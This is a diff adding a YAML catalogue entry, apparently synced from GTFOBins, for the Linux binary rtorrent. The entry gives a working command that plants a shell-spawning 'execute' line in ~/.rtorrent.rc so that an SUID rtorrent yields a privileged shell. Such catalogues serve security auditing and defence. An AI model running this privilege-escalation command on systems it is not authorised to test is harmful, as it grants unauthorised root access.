@@ -1,0 +1,27 @@
+id: gtfobins/rtorrent/shell/suid
+type: binary
+platform: linux
+name: rtorrent
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo ''execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"'' >~/.rtorrent.rc
+
+    rtorrent'
+  comment: After the shell, exit with `Ctrl-Q`.
+references:
+- https://gtfobins.github.io/gtfobins/rtorrent/
+tags:
+- linux
+- unix
+- gtfobins
